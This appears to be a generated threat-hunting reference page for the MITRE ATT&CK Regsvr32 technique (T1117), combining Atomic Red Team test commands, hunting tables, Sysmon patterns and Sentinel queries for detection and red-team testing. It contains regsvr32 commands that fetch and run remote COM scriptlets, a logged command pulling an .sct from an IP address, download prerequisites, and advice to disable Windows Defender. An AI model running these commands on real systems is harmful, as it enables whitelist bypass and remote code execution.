
# Regsvr32

## Description

### MITRE Description

> Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)

## Additional Attributes

* Bypass: ['Process whitelisting', 'Anti-virus', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1117

## Potential Commands

```
regsvr32.exe /s /u /i:PathToAtomicsFolder\T1117\src\RegSvr32.sct scrobj.dll

regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll

IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll )

excel.exe
regsvr32.exe
mshta.exe
regsvr32.exe
odbcconf.exe
regsvr32.exe
powerpoint.exe
regsvr32.exe
reg32svr.exe
regsvr32.exe /i (http:|ftp:)
scrobj.dll
winword.exe
regsvr32.exe
\\Windows\\.+\\regsvr32.exe/s|/i
Log
EventID: 1
Image: C: \ Windows \ System32 \ regsvr32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Microsoft (C) Register Server
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: REGSVR32.EXE
CommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll
# Sysmon log
```

## Commands Dataset

```
[{'command': 'regsvr32.exe /s /u '
             '/i:PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct scrobj.dll\n',
  'name': None,
  'source': 'atomics/T1117/T1117.yaml'},
 {'command': 'regsvr32.exe /s /u '
             '/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct '
             'scrobj.dll\n',
  'name': None,
  'source': 'atomics/T1117/T1117.yaml'},
 {'command': 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" '
             '(C:\\Windows\\syswow64\\regsvr32.exe /s '
             'PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll) ELSE ( '
             'regsvr32.exe /s '
             'PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll )\n',
  'name': None,
  'source': 'atomics/T1117/T1117.yaml'},
 {'command': 'excel.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'mshta.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'odbcconf.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'powerpoint.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'reg32svr.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe /i (http:|ftp:)',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'scrobj.dll',
  'name': 'loaded_dll',
  'source': 'Threat Hunting Tables'},
 {'command': 'winword.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'regsvr32.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': '\\\\Windows\\\\.+\\\\regsvr32.exe/s|/i',
  'name': None,
  'source': 'SysmonHunter - Regsvr32'},
 {'command': 'Log\n'
             'EventID: 1\n'
             'Image: C: \\ Windows \\ System32 \\ regsvr32.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: Microsoft (C) Register Server\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: REGSVR32.EXE\n'
             'CommandLine: regsvr32 / s / n / u '
             '/i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n'
             '# Sysmon log',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Bypassing Application Whitelisting With Regsvr32',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and (process_path contains '
           '"regsvr32.exe"or process_path contains "rundll32.exe"or '
           'process_path contains "certutil.exe")or process_command_line '
           'contains "scrobj.dll"'},
 {'name': 'Regsvr32 Network',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 3 and (process_parent_path contains '
           '"\\\\regsvr32.exe"or process_path contains "\\\\regsvr32.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Regsvr32': {'atomic_tests': [{'dependencies': [{'description': 'Regsvr32.sct '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{filename})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{filename}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct" '
                                                                                                '-OutFile '
                                                                                                '"#{filename}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{filename}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Regsvr32.exe '
                                                                       'is a '
                                                                       'command-line '
                                                                       'program '
                                                                       'used '
                                                                       'to '
                                                                       'register '
                                                                       'and '
                                                                       'unregister '
                                                                       'OLE '
                                                                       'controls. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched.\n',
                                                        'executor': {'command': 'regsvr32.exe '
                                                                                '/s '
                                                                                '/u '
                                                                                '/i:#{filename} '
                                                                                'scrobj.dll\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'filename': {'default': 'PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct',
                                                                                         'description': 'Name '
                                                                                                        'of '
                                                                                                        'the '
                                                                                                        'local '
                                                                                                        'file, '
                                                                                                        'include '
                                                                                                        'path.',
                                                                                         'type': 'Path'}},
                                                        'name': 'Regsvr32 '
                                                                'local COM '
                                                                'scriptlet '
                                                                'execution',
                                                        'supported_platforms': ['windows']},
                                                       {'description': 'Regsvr32.exe '
                                                                       'is a '
                                                                       'command-line '
                                                                       'program '
                                                                       'used '
                                                                       'to '
                                                                       'register '
                                                                       'and '
                                                                       'unregister '
                                                                       'OLE '
                                                                       'controls. '
                                                                       'This '
                                                                       'test '
                                                                       'may be '
                                                                       'blocked '
                                                                       'by '
                                                                       'windows '
                                                                       'defender; '
                                                                       'disable\n'
                                                                       'windows '
                                                                       'defender '
                                                                       'real-time '
                                                                       'protection '
                                                                       'to fix '
                                                                       'it. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched.\n',
                                                        'executor': {'command': 'regsvr32.exe '
                                                                                '/s '
                                                                                '/u '
                                                                                '/i:#{url} '
                                                                                'scrobj.dll\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct',
                                                                                    'description': 'URL '
                                                                                                   'to '
                                                                                                   'hosted '
                                                                                                   'sct '
                                                                                                   'file',
                                                                                    'type': 'Url'}},
                                                        'name': 'Regsvr32 '
                                                                'remote COM '
                                                                'scriptlet '
                                                                'execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'AllTheThingsx86.dll '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{dll_name})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{dll_name}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll" '
                                                                                                '-OutFile '
                                                                                                '"#{dll_name}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{dll_name}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Regsvr32.exe '
                                                                       'is a '
                                                                       'command-line '
                                                                       'program '
                                                                       'used '
                                                                       'to '
                                                                       'register '
                                                                       'and '
                                                                       'unregister '
                                                                       'OLE '
                                                                       'controls. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched.\n',
                                                        'executor': {'command': 'IF '
                                                                                '"%PROCESSOR_ARCHITECTURE%"=="AMD64" '
                                                                                '(C:\\Windows\\syswow64\\regsvr32.exe '
                                                                                '/s '
                                                                                '#{dll_name}) '
                                                                                'ELSE '
                                                                                '( '
                                                                                'regsvr32.exe '
                                                                                '/s '
                                                                                '#{dll_name} '
                                                                                ')\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'dll_name': {'default': 'PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll',
                                                                                         'description': 'Name '
                                                                                                        'of '
                                                                                                        'DLL '
                                                                                                        'to '
                                                                                                        'Execute, '
                                                                                                        'DLL '
                                                                                                        'Should '
                                                                                                        'export '
                                                                                                        'DllRegisterServer',
                                                                                         'type': 'Path'}},
                                                        'name': 'Regsvr32 '
                                                                'local DLL '
                                                                'execution',
                                                        'supported_platforms': ['windows']}],
                                      'attack_technique': 'T1117',
                                      'display_name': 'Regsvr32'}},
 {'Threat Hunting Tables': {'chain_id': '100032',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'regsvr32',
                            'os': 'windows',
                            'parent_process': 'excel.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'regsvr32.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100046',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'regsvr32',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'regsvr32.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100055',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'ccb1fa5cdbc402b912b01a1838c1f13e95e9392b3ab6cc5f28277c012b0759f9',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'regsvr32',
                            'os': 'windows',
                            'parent_process': 'odbcconf.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'regsvr32.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100063',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'regsvr32',
                            'os': 'windows',
                            'parent_process': 'powerpoint.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'regsvr32.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100069',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': '',
                            'os': 'windows',
                            'parent_process': 'reg32svr.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100070',
                            'commandline_string': '/i (http:|ftp:)',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': 'scrobj.dll',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'reg32svr',
                            'os': 'windows',
                            'parent_process': 'regsvr32.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100095',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1117',
                            'mitre_caption': 'regsvr32',
                            'os': 'windows',
                            'parent_process': 'winword.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'regsvr32.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1117': {'description': None,
                           'level': 'medium',
                           'name': 'Regsvr32',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'op': 'and',
                                                              'pattern': '/s|/i'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\regsvr32.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [Deep Panda](../actors/Deep-Panda.md)

* [APT32](../actors/APT32.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT19](../actors/APT19.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [WIRTE](../actors/WIRTE.md)
    
